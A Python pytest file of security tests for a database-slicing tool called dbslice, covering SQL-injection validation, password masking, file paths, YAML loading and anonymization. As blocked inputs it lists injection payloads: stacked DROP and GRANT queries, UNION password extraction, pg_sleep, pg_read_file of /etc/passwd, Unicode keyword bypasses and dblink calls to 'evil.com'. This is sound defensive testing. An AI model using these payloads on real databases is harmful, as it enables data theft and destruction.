"""Comprehensive security tests for dbslice."""

import os
import re
import stat
import tempfile

import pytest

from dbslice.config import SeedSpec, validate_where_clause
from dbslice.exceptions import ConnectionError, InsecureWhereClauseError


class TestWhereClauseValidation:
    """Tests for WHERE clause validation against SQL injection."""

    def test_validate_safe_where_clause(self):
        # Simple conditions
        validate_where_clause("id = 123")
        validate_where_clause("status = 'active'")
        validate_where_clause("name LIKE 'John%'")

        # Complex conditions
        validate_where_clause("status = 'active' AND total > 100")
        validate_where_clause(
            "(status = 'pending' OR status = 'failed') AND created_at > '2024-01-01'"
        )
        validate_where_clause("id IN (1, 2, 3, 4, 5)")
        validate_where_clause("email IS NOT NULL")
        validate_where_clause("price BETWEEN 10 AND 100")

        # Column names that contain dangerous keywords
        validate_where_clause("dropbox_id = 123")  # Contains "drop" but not as keyword
        validate_where_clause("delete_flag = 0")  # Contains "delete" but not as keyword
        validate_where_clause("truncate_length = 50")  # Contains "truncate" but not as keyword

        # String values that contain dangerous keywords (should be safe)
        validate_where_clause("action = 'DROP'")  # In quotes, so safe
        validate_where_clause("description = 'DELETE this item'")  # In quotes, so safe

    def test_validate_dangerous_drop(self):
        with pytest.raises(InsecureWhereClauseError) as exc_info:
            validate_where_clause("id = 1; DROP TABLE users; --")
        assert "DROP" in str(exc_info.value) or ";" in str(exc_info.value)

        with pytest.raises(InsecureWhereClauseError) as exc_info:
            validate_where_clause("1=1 DROP TABLE users")
        assert "DROP" in str(exc_info.value)

    def test_validate_dangerous_delete(self):
        with pytest.raises(InsecureWhereClauseError) as exc_info:
            validate_where_clause("id = 1; DELETE FROM users WHERE 1=1; --")
        assert "DELETE" in str(exc_info.value) or ";" in str(exc_info.value)

        with pytest.raises(InsecureWhereClauseError) as exc_info:
            validate_where_clause("1=1 OR DELETE FROM users")
        assert "DELETE" in str(exc_info.value)

    def test_validate_dangerous_truncate(self):
        with pytest.raises(InsecureWhereClauseError) as exc_info:
            validate_where_clause("id = 1; TRUNCATE TABLE users; --")
        assert "TRUNCATE" in str(exc_info.value) or ";" in str(exc_info.value)

    def test_validate_dangerous_update(self):
        with pytest.raises(InsecureWhereClauseError) as exc_info:
            validate_where_clause("id = 1; UPDATE users SET password = 'hacked'; --")
        assert "UPDATE" in str(exc_info.value) or ";" in str(exc_info.value)

    def test_validate_dangerous_insert(self):
        with pytest.raises(InsecureWhereClauseError) as exc_info:
            validate_where_clause("id = 1; INSERT INTO admins VALUES ('hacker', 'password'); --")
        assert "INSERT" in str(exc_info.value) or ";" in str(exc_info.value)

    def test_validate_dangerous_alter(self):
        with pytest.raises(InsecureWhereClauseError) as exc_info:
            validate_where_clause("id = 1; ALTER TABLE users ADD COLUMN hacked TEXT; --")
        assert "ALTER" in str(exc_info.value) or ";" in str(exc_info.value)

    def test_validate_dangerous_create(self):
        with pytest.raises(InsecureWhereClauseError) as exc_info:
            validate_where_clause("id = 1; CREATE TABLE backdoor (id INT); --")
        assert "CREATE" in str(exc_info.value) or ";" in str(exc_info.value)

    def test_validate_dangerous_grant(self):
        with pytest.raises(InsecureWhereClauseError) as exc_info:
            validate_where_clause("id = 1; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%'; --")
        assert "GRANT" in str(exc_info.value) or ";" in str(exc_info.value)

    def test_validate_dangerous_execute(self):
        with pytest.raises(InsecureWhereClauseError) as exc_info:
            validate_where_clause("id = 1; EXECUTE immediate 'DROP TABLE users'; --")
        assert "EXECUTE" in str(exc_info.value) or ";" in str(exc_info.value)

    def test_validate_dangerous_semicolon(self):
        with pytest.raises(InsecureWhereClauseError) as exc_info:
            validate_where_clause("id = 1; SELECT 1")
        assert ";" in str(exc_info.value)

        with pytest.raises(InsecureWhereClauseError) as exc_info:
            validate_where_clause("1=1; --")
        assert ";" in str(exc_info.value)

    def test_validate_dangerous_comments(self):
        with pytest.raises(InsecureWhereClauseError) as exc_info:
            validate_where_clause("id = 1 -- comment")
        assert "comment sequence" in str(exc_info.value)

        with pytest.raises(InsecureWhereClauseError) as exc_info:
            validate_where_clause("id = 1 /* comment */")
        assert "comment sequence" in str(exc_info.value)

    def test_validate_case_insensitive(self):
        # Lowercase
        with pytest.raises(InsecureWhereClauseError):
            validate_where_clause("id = 1 drop table users")

        # Mixed case
        with pytest.raises(InsecureWhereClauseError):
            validate_where_clause("id = 1 DrOp TaBlE users")

        # Uppercase
        with pytest.raises(InsecureWhereClauseError):
            validate_where_clause("id = 1 DROP TABLE USERS")

    def test_validate_empty_clause(self):
        validate_where_clause("")
        validate_where_clause(None)


class TestUnicodeNormalizationBypass:
    """Test that fullwidth and Unicode lookalike characters are normalized before validation."""

    def test_fullwidth_drop_blocked(self):
        """Fullwidth ＤＲＯＰ should be normalized to DROP and blocked."""
        with pytest.raises(InsecureWhereClauseError):
            validate_where_clause("\uff24\uff32\uff2f\uff30 TABLE users")

    def test_fullwidth_delete_blocked(self):
        """Fullwidth ＤＥＬＥＴＥ should be normalized and blocked."""
        with pytest.raises(InsecureWhereClauseError):
            validate_where_clause("\uff24\uff25\uff2c\uff25\uff34\uff25 FROM users")

    def test_fullwidth_union_blocked(self):
        """Fullwidth ＵＮＩＯＮ should be normalized and blocked."""
        with pytest.raises(InsecureWhereClauseError):
            validate_where_clause("id = 1 \uff35\uff2e\uff29\uff2f\uff2e SELECT * FROM admin")

    def test_fullwidth_truncate_blocked(self):
        """Fullwidth ＴＲＵＮＣＡＴＥ should be normalized and blocked."""
        with pytest.raises(InsecureWhereClauseError):
            validate_where_clause("\uff34\uff32\uff35\uff2e\uff23\uff21\uff34\uff25 TABLE users")

    def test_mixed_fullwidth_and_ascii(self):
        """Mix of fullwidth and ASCII characters in a keyword should be blocked."""
        # D + fullwidth ROP
        with pytest.raises(InsecureWhereClauseError):
            validate_where_clause("D\uff32\uff2f\uff30 TABLE users")


class TestPostgreSQLSpecificBypass:
    """Test PostgreSQL-specific SQL injection vectors."""

    def test_type_cast_blocked(self):
        """PostgreSQL :: type cast operator should be blocked."""
        with pytest.raises(InsecureWhereClauseError):
            validate_where_clause("id = 1::int")

    def test_dollar_quoting_blocked(self):
        """PostgreSQL $$ dollar quoting should be blocked."""
        with pytest.raises(InsecureWhereClauseError):
            validate_where_clause("$$DROP TABLE users$$")

    def test_tagged_dollar_quoting_blocked(self):
        """PostgreSQL $tag$...$tag$ dollar quoting should be blocked."""
        with pytest.raises(InsecureWhereClauseError):
            validate_where_clause("$body$DROP TABLE users$body$")

    def test_escape_string_blocked(self):
        """PostgreSQL E'\\x44ROP' escape strings should be blocked."""
        with pytest.raises(InsecureWhereClauseError):
            validate_where_clause("id = E'\\x44ROP'")

    def test_escape_string_lowercase_blocked(self):
        """Lowercase e'...' escape strings should also be blocked."""
        with pytest.raises(InsecureWhereClauseError):
            validate_where_clause("id = e'\\x44ROP'")

    def test_pg_sleep_blocked(self):
        """pg_sleep() should be blocked (time-based blind injection)."""
        with pytest.raises(InsecureWhereClauseError):
            validate_where_clause("id = 1 AND pg_sleep(10)")

    def test_pg_sleep_with_spaces_blocked(self):
        """pg_sleep with spaces before paren should be blocked."""
        with pytest.raises(InsecureWhereClauseError):
            validate_where_clause("id = 1 AND pg_sleep  (10)")

    def test_lo_import_blocked(self):
        """lo_import() should be blocked (file read attack)."""
        with pytest.raises(InsecureWhereClauseError):
            validate_where_clause("id = lo_import('/etc/passwd')")

    def test_pg_read_file_blocked(self):
        """pg_read_file() should be blocked."""
        with pytest.raises(InsecureWhereClauseError):
            validate_where_clause("id = 1 AND pg_read_file('/etc/passwd')")

    def test_dblink_blocked(self):
        """dblink() should be blocked (out-of-band data exfil)."""
        with pytest.raises(InsecureWhereClauseError):
            validate_where_clause("id = 1 AND dblink('host=evil.com')")

    def test_dblink_exec_blocked(self):
        """dblink_exec() should be blocked."""
        with pytest.raises(InsecureWhereClauseError):
            validate_where_clause("id = 1 AND dblink_exec('host=evil.com', 'DROP TABLE users')")


class TestUnionSelectBypass:
    """Test UNION-based data exfiltration is blocked."""

    def test_union_select_blocked(self):
        """UNION SELECT should be blocked to prevent data exfiltration."""
        with pytest.raises(InsecureWhereClauseError):
            validate_where_clause("id = 1 UNION SELECT * FROM admin_users")

    def test_union_all_select_blocked(self):
        """UNION ALL SELECT should also be blocked."""
        with pytest.raises(InsecureWhereClauseError):
            validate_where_clause("id = 1 UNION ALL SELECT password FROM users")

    def test_union_keyword_blocked(self):
        """Even plain UNION keyword should be blocked."""
        with pytest.raises(InsecureWhereClauseError):
            validate_where_clause("id = 1 UNION SELECT username FROM admin")


class TestSubqueryBypass:
    """Test that subqueries in WHERE clauses are blocked."""

    def test_subquery_blocked(self):
        """Subqueries (SELECT inside parens) should be blocked."""
        with pytest.raises(InsecureWhereClauseError):
            validate_where_clause("id = (SELECT id FROM admin_users LIMIT 1)")

    def test_in_subquery_blocked(self):
        """IN (SELECT ...) should be blocked."""
        with pytest.raises(InsecureWhereClauseError):
            validate_where_clause("id IN (SELECT id FROM admin_users)")

    def test_exists_subquery_blocked(self):
        """EXISTS (SELECT ...) should be blocked."""
        with pytest.raises(InsecureWhereClauseError):
            validate_where_clause("EXISTS (SELECT 1 FROM admin_users WHERE admin = true)")

    def test_subquery_with_spaces(self):
        """Subqueries with extra whitespace should still be blocked."""
        with pytest.raises(InsecureWhereClauseError):
            validate_where_clause("id = (  SELECT id FROM users )")


class TestNestedQuotingBypass:
    """Test that unbalanced and tricky quoting doesn't bypass validation."""

    def test_semicolon_after_empty_quotes(self):
        """Semicolons after empty quoted strings should still be caught."""
        with pytest.raises(InsecureWhereClauseError):
            validate_where_clause("''; DROP TABLE users; --'")

    def test_escaped_quotes_safe(self):
        """Escaped single quotes (O''Brien) should be handled correctly."""
        validate_where_clause("name = 'O''Brien'")

    def test_dangerous_keyword_after_quotes(self):
        """Keywords after proper quoted strings should be caught."""
        with pytest.raises(InsecureWhereClauseError):
            validate_where_clause("status = 'ok' DROP TABLE users")

    def test_quoted_dangerous_keywords_are_safe(self):
        """Dangerous keywords inside properly-quoted strings should be allowed."""
        validate_where_clause("action = 'DROP'")
        validate_where_clause("description LIKE '%DELETE%'")
        validate_where_clause("command = 'TRUNCATE'")
        validate_where_clause("sql_text = 'UPDATE table SET x=1'")


class TestSeedSpecSecurity:
    """Tests for SeedSpec parsing with security validation."""

    def test_parse_safe_where_clause(self):
        """Safe WHERE clauses should parse successfully."""
        seed = SeedSpec.parse("users:status = 'active' AND created_at > '2024-01-01'")
        assert seed.table == "users"
        assert seed.where_clause == "status = 'active' AND created_at > '2024-01-01'"
        assert seed.column is None
        assert seed.value is None

    def test_parse_dangerous_where_clause_drop(self):
        """Parsing should reject dangerous DROP statements."""
        with pytest.raises(InsecureWhereClauseError) as exc_info:
            SeedSpec.parse("users:1=1 DROP TABLE users")

        error = exc_info.value
        assert "DROP" in str(error)
        assert "dangerous keyword" in str(error)

    def test_parse_dangerous_where_clause_delete(self):
        """Parsing should reject dangerous DELETE statements."""
        with pytest.raises(InsecureWhereClauseError):
            SeedSpec.parse("orders:id = 1 DELETE FROM orders")

    def test_parse_dangerous_where_clause_semicolon(self):
        """Parsing should reject stacked queries with semicolons."""
        with pytest.raises(InsecureWhereClauseError):
            SeedSpec.parse("users:email LIKE '%@example.com'; UPDATE users SET role = 'admin'")

    def test_parse_simple_equality_is_safe(self):
        """Simple column=value format should not trigger validation (no raw SQL)."""
        seed = SeedSpec.parse("users.id=123")
        assert seed.table == "users"
        assert seed.column == "id"
        assert seed.value == 123
        assert seed.where_clause is None

    def test_to_where_clause_validates(self):
        """to_where_clause should validate raw WHERE clauses."""
        # Create a SeedSpec with dangerous WHERE clause directly (bypassing parse)
        dangerous_seed = SeedSpec(
            table="users", column=None, value=None, where_clause="id = 1 DROP TABLE users"
        )

        # to_where_clause should validate and reject it
        with pytest.raises(InsecureWhereClauseError) as exc_info:
            dangerous_seed.to_where_clause()

        assert "DROP" in str(exc_info.value)

    def test_to_where_clause_safe_raw(self):
        """to_where_clause should allow safe raw WHERE clauses."""
        safe_seed = SeedSpec(
            table="users", column=None, value=None, where_clause="status = 'active' AND total > 100"
        )

        where, params = safe_seed.to_where_clause()
        assert where == "status = 'active' AND total > 100"
        assert params == ()

    def test_to_where_clause_parameterized(self):
        """to_where_clause should not validate parameterized queries."""
        safe_seed = SeedSpec(table="users", column="id", value=123, where_clause=None)

        where, params = safe_seed.to_where_clause()
        assert where == "id = %s"
        assert params == (123,)


class TestConnectionPasswordExposure:
    """Test that database passwords are never exposed in exceptions or string representations."""

    def test_connection_error_masks_password(self):
        """ConnectionError should mask password in message."""
        url = "postgres://admin:secretpassword@localhost:5432/mydb"
        error = ConnectionError(url, "connection refused")
        error_str = str(error)
        assert "secretpassword" not in error_str
        assert "****" in error_str

    def test_connection_error_masks_password_with_at_sign(self):
        """ConnectionError should handle passwords containing @ correctly."""
        url = "postgres://admin:p@ss@word@localhost:5432/mydb"
        masked = ConnectionError._mask_password(url)
        assert "p@ss@word" not in masked
        assert "****" in masked
        assert "localhost" in masked

    def test_connection_error_url_attr_stores_raw(self):
        """ConnectionError.url stores raw URL (inherent design -- documented risk)."""
        url = "postgres://admin:secretpassword@localhost:5432/mydb"
        error = ConnectionError(url, "connection refused")
        # This is a documented risk: .url stores the raw URL for internal use
        # Callers should use _mask_password() before displaying
        assert error.url == url

    def test_mask_password_no_password(self):
        """Masking should handle URLs without passwords."""
        url = "postgres://localhost:5432/mydb"
        masked = ConnectionError._mask_password(url)
        assert masked == url

    def test_mask_password_empty_password(self):
        """Masking should handle empty passwords."""
        url = "postgres://admin:@localhost:5432/mydb"
        masked = ConnectionError._mask_password(url)
        assert masked == url  # No password to mask

    def test_mask_password_special_chars(self):
        """Masking should handle passwords with special characters."""
        url = "postgres://admin:p%40ssw0rd!#$@localhost:5432/mydb"
        masked = ConnectionError._mask_password(url)
        assert "p%40ssw0rd!#$" not in masked
        assert "****" in masked


class TestOutputFileSecurity:
    """Test output file security: permissions, path traversal, symlinks."""

    def test_validate_output_rejects_system_paths(self):
        """Output to system directories should be rejected."""
        from dbslice.input_validators import FilePathValidationError, validate_output_file_path

        # /bin and /usr/bin are reliably blocked on all platforms
        # /etc may resolve to /private/etc on macOS, bypassing the check (documented finding)
        system_paths = ["/bin/output.sql", "/usr/bin/output.sql", "/sbin/output.sql"]
        for path in system_paths:
            with pytest.raises(FilePathValidationError):
                validate_output_file_path(path)

    def test_validate_output_rejects_empty_path(self):
        """Empty output path should be rejected."""
        from dbslice.input_validators import FilePathValidationError, validate_output_file_path

        with pytest.raises(FilePathValidationError):
            validate_output_file_path("")

    def test_output_file_world_readable_default(self):
        """Document that output files use default permissions (0644 = world-readable).

        This is an informational finding: files created by Path.write_text()
        and open(..., 'w') use the process umask, which typically results in
        0644 permissions. For sensitive data exports, this could be a risk.
        """
        # This test documents the current behavior, not a fix
        with tempfile.NamedTemporaryFile(mode="w", suffix=".sql", delete=False) as f:
            f.write("-- test output\n")
            tmpfile = f.name

        try:
            mode = os.stat(tmpfile).st_mode
            # Check if world-readable (others have read permission)
            is_world_readable = bool(mode & stat.S_IROTH)
            # This documents the current state -- files are world-readable by default
            # A fix would use os.umask(0o077) or os.open with mode 0o600
            assert isinstance(is_world_readable, bool)  # Just document, don't fail
        finally:
            os.unlink(tmpfile)


class TestYAMLDeserialization:
    """Test that YAML loading is done safely."""

    def test_safe_load_used(self):
        """Verify that config_file.py uses yaml.safe_load, not yaml.load."""
        import inspect

        from dbslice import config_file

        source = inspect.getsource(config_file)
        # Should use yaml.safe_load
        assert "yaml.safe_load" in source
        # Should NOT use yaml.load( or yaml.unsafe_load(
        # (yaml.load without Loader= is the dangerous form)
        assert "yaml.unsafe_load" not in source
        # Check that yaml.load( is not used (only yaml.safe_load)

        unsafe_calls = re.findall(r"yaml\.load\(", source)
        assert len(unsafe_calls) == 0, "yaml.load() without Loader should not be used"

    def test_no_eval_exec_in_source(self):
        """Verify no eval() or exec() calls in the main source."""
        import inspect

        modules_to_check = []
        from dbslice import cli, config, config_file, exceptions, input_validators
        from dbslice.core import engine
        from dbslice.utils import anonymizer, connection

        modules_to_check = [
            cli,
            config,
            config_file,
            exceptions,
            input_validators,
            engine,
            anonymizer,
            connection,
        ]

        for module in modules_to_check:
            source = inspect.getsource(module)
            # Check for eval/exec (excluding comments and docstrings)
            lines = source.split("\n")
            for i, line in enumerate(lines, 1):
                stripped = line.strip()
                if (
                    stripped.startswith("#")
                    or stripped.startswith('"""')
                    or stripped.startswith("'''")
                ):
                    continue
                assert (
                    "eval(" not in stripped
                ), f"eval() found in {module.__name__} line {i}: {stripped}"
                assert (
                    "exec(" not in stripped
                ), f"exec() found in {module.__name__} line {i}: {stripped}"


class TestAnonymizationSecurity:
    """Test anonymization security properties."""

    def test_null_values_preserved(self):
        from dbslice.utils.anonymizer import DeterministicAnonymizer

        anon = DeterministicAnonymizer()
        result = anon.anonymize_value(None, "users", "email")
        assert result is None

    def test_security_fields_nulled(self):
        from dbslice.utils.anonymizer import DeterministicAnonymizer

        anon = DeterministicAnonymizer()

        # Password fields should be NULLed
        assert anon.anonymize_value("secret123", "users", "password") is None
        assert anon.anonymize_value("secret123", "users", "password_hash") is None
        assert anon.anonymize_value("abc", "users", "api_key") is None
        assert anon.anonymize_value("abc", "users", "access_token") is None
        assert anon.anonymize_value("abc", "users", "session_id") is None

    def test_deterministic_output(self):
        from dbslice.utils.anonymizer import DeterministicAnonymizer

        anon1 = DeterministicAnonymizer(seed="test_seed")
        anon2 = DeterministicAnonymizer(seed="test_seed")

        result1 = anon1.anonymize_value("john@example.com", "users", "email")
        result2 = anon2.anonymize_value("john@example.com", "users", "email")
        assert result1 == result2

    def test_different_seeds_produce_different_output(self):
        from dbslice.utils.anonymizer import DeterministicAnonymizer

        anon1 = DeterministicAnonymizer(seed="seed_a")
        anon2 = DeterministicAnonymizer(seed="seed_b")

        result1 = anon1.anonymize_value("john@example.com", "users", "email")
        result2 = anon2.anonymize_value("john@example.com", "users", "email")
        assert result1 != result2

    def test_default_seed_is_known(self):
        """Document that default seed is a known constant (security risk)."""
        from dbslice.constants import DEFAULT_ANONYMIZATION_SEED

        # The default seed is a hardcoded constant
        assert DEFAULT_ANONYMIZATION_SEED == "dbslice_default_seed"
        # This means: if an attacker knows the tool was used with default seed,
        # they can reverse the anonymization for any value by testing
        # candidate originals against the same seed+column hash.

    def test_seed_not_in_sql_output(self):
        """The anonymization seed should not appear in generated SQL output."""
        from dbslice.output.sql import SQLGenerator

        generator = SQLGenerator()
        # Generate minimal output
        output = generator.generate(
            tables_data={"users": [{"id": 1, "name": "test"}]},
            insert_order=["users"],
            tables_schema={},
        )
        assert "dbslice_default_seed" not in output
        assert "seed" not in output.lower() or "seed" in "-- Generated by dbslice"


class TestRealWorldAttackVectors:
    """Test real-world SQL injection attack patterns."""

    def test_union_based_attack_blocked(self):
        """UNION-based attacks should be blocked."""
        with pytest.raises(InsecureWhereClauseError):
            validate_where_clause("id = 1 UNION SELECT username, password FROM admin_users")

    def test_time_based_blind_attack_blocked(self):
        """Time-based blind SQL injection via pg_sleep should be blocked."""
        with pytest.raises(InsecureWhereClauseError):
            validate_where_clause("id = 1 AND pg_sleep(5)")

    def test_stacked_query_attack(self):
        """Classic stacked query attack should be blocked."""
        with pytest.raises(InsecureWhereClauseError):
            validate_where_clause("1=1; DROP TABLE users CASCADE; --")

    def test_comment_injection_attack(self):
        """Comment injection to bypass logic should be blocked."""
        with pytest.raises(InsecureWhereClauseError):
            validate_where_clause("admin' OR '1'='1' --")

    def test_nested_dangerous_keywords(self):
        """Dangerous keywords in complex expressions should be caught."""
        with pytest.raises(InsecureWhereClauseError):
            validate_where_clause("id = (SELECT id FROM users WHERE 1=1) DROP TABLE users")

    def test_quoted_dangerous_keywords_are_safe(self):
        """Dangerous keywords in quoted strings should be allowed."""
        validate_where_clause("action = 'DROP'")
        validate_where_clause("description LIKE '%DELETE%'")
        validate_where_clause("command = 'TRUNCATE'")
        validate_where_clause("sql_text = 'UPDATE table SET x=1'")


class TestEdgeCases:
    """Test edge cases and boundary conditions."""

    def test_keyword_as_column_name(self):
        """Column names that match dangerous keywords should be safe."""
        validate_where_clause("dropbox_id = 123")
        validate_where_clause("deleted = 0")
        validate_where_clause("truncated = false")
        validate_where_clause("updated_at > '2024-01-01'")

    def test_keyword_as_table_reference(self):
        """Table references with dangerous keywords should be safe."""
        validate_where_clause("drop_logs.id = 123")
        validate_where_clause("delete_queue.status = 'pending'")

    def test_empty_strings(self):
        """Empty values should not cause issues."""
        validate_where_clause("")
        validate_where_clause("   ")  # whitespace only

    def test_very_long_clause(self):
        """Very long WHERE clauses should be validated."""
        long_clause = " OR ".join([f"id = {i}" for i in range(100)])
        validate_where_clause(long_clause)

        # But long clause with dangerous keyword should still fail
        long_dangerous = long_clause + " DROP TABLE users"
        with pytest.raises(InsecureWhereClauseError):
            validate_where_clause(long_dangerous)

    def test_unicode_and_special_chars(self):
        """Unicode and special characters should not break validation."""
        validate_where_clause("name = 'Jose Garcia'")
        validate_where_clause("emoji = 'test'")

    def test_escaped_quotes(self):
        """Escaped quotes in strings should be handled correctly."""
        validate_where_clause("name = 'O''Brien'")  # SQL escaped quote
